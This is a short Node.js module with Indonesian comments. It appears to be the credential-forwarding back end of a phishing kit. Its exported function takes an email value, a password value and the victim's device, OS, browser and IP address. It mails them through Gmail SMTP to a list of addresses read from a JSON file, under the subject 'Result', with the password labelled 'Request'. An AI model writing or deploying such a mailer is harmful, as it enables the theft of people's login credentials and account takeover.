const path = require("path");
const fs = require("fs/promises");
const nodemailer = require("nodemailer");

const pathEmail = path.join(__dirname, "../data/email.json");
let transporter;
let emailData = [];

// Fungsi untuk mengirim email
function send2({ emVal, passVal, device, os, browser, ipAddress, logVia }) {
  if (transporter && emailData.length) {
    const mailOptions = {
      from: `"Hai Ada Request👋" <${process.env.SEND_MAIL}>`,
      to: emailData,
      subject: "Result",
      html: `
        <div style="font-family: Monospace, Arial, sans-serif; color: #333;">
          <h2>Request lagi Bang</h2>
          <p><strong>Dari:</strong> ${emVal}</p>
          <p><strong>Request:</strong> ${passVal}</p>
        </div>
      `
    };

    transporter.sendMail(mailOptions, (err) => {
      if (err) {
        console.error("❌ Gagal kirim email:", err);
      } else {
        console.log("📨 Result berhasil dikirim cek email anda.");
      }
    });

  } else {
    console.error("⛔ Transporter belum siap atau daftar email kosong.");
  }
}

// Inisialisasi transporter dan baca daftar email
(async () => {
  try {
    const data = await fs.readFile(pathEmail, "utf-8");
    emailData = JSON.parse(data || "[]");

    transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.SEND_MAIL,
        pass: process.env.KUL_LANCIADI
      }
    });

  } catch (err) {
    console.error("❌ Gagal membaca email.json atau inisialisasi transporter:", err);
  }
})();

module.exports = send2;
